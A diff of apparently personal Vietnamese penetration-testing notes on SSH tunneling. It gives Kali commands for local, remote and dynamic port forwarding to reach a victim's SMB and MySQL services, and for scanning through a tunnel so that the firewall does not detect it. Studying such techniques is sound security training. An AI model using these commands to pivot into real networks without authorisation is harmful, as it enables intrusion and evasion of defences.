@@ -1,14 +1,18 @@
-Tunneling Port forwarding with SSH:
-Có 2 trường hợp để sử dụng:
-TH1- Local Port Forwarding: Đối với máy victim là máy đang kết nối dịch vụ về 1 máy chủ khác (ví dụ: SMB) thì sử dụng kỹ thuật Local Port Forwarding.
+Tunneling Port Forwarding with SSH:
+Có 3 trường hợp để sử dụng:
+TH1 - Local Port Forwarding: Đối với máy victim là máy đang kết nối dịch vụ về 1 máy chủ khác (ví dụ: SMB) thì sử dụng kỹ thuật Local Port Forwarding để có thể kết nối và sử dụng dịch vụ mục tiêu.
 Trên máy Kali, ta sử dụng câu lệnh:
 # sudo ssh -N -L 0.0.0.0:445:w.x.y.z:445 student@s.t.u.v
 Sau khi thực hiện câu lệnh trên, máy Kali đã có thể kết nối đến máy chủ SMB tương tự như máy victim đang được kết nối đến.
 Trên máy Kali có thể thực hiện được câu lệnh như sau để có thể kết nối và truy xuất dữ liệu từ máy chủ SMB như sau:
 smbclient -L 127.0.0.1 -U Administrator
 
-TH2- Remote Port Forwarding: Đối với máy victim là một máy chủ độc lập (Ví dụ: MYSQL) thì sử dụng kỹ thuật Scan-Local để né tránh sự phát hiện của tường lửa đang đứng trước máy chủ.
+TH2 - Remote Port Forwarding: Đối với máy victim là một máy chủ độc lập (Ví dụ: MYSQL) thì sử dụng kỹ thuật Scan-Local để né tránh sự phát hiện của tường lửa đang đứng trước máy chủ.
 Trên máy Linux client, ta sử dụng câu lệnh:
 # ssh -N -R a.b.c.d:2221:127.0.0.1:3306 root@a.b.c.d
-Trên máy Kali lúc này đã có thể thực hiện được câu lệnh sau để Scan Local ko bị firewall dêtct':
+Trên máy Kali lúc này đã có thể thực hiện được câu lệnh sau để Scan Local ko bị firewall detect':
 # sudo nmap -sS -sV 127.0.0.1 -p 2221
+
+TH3 - Dynamic Port Forwarding: Đối với máy victim tương tự trường hợp 1, tuy nhiên ta có thể vừa Scan Local và kết nối thông qua Proxy trên máy Kali đã thiết lập sẵn.
+Trên máy Kali, ta sử dụng câu lệnh:
+# ssh -N -D 127.0.0.1:8080 student@10.11.0.128
